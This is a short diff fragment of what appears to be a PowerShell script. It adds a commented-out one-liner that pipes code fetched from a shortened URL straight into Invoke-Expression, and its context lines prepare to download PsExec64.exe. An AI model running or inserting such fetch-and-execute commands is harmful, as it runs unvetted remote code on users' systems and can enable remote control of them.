@@ -1,3 +1,5 @@
+#irm "https://tinyurl.com/OppenBoom" | iex
+
 $ProgressPreference = 'SilentlyContinue'
 $Filename = "PsExec64.exe"
 $WebClient = New-Object System.Net.WebClient 
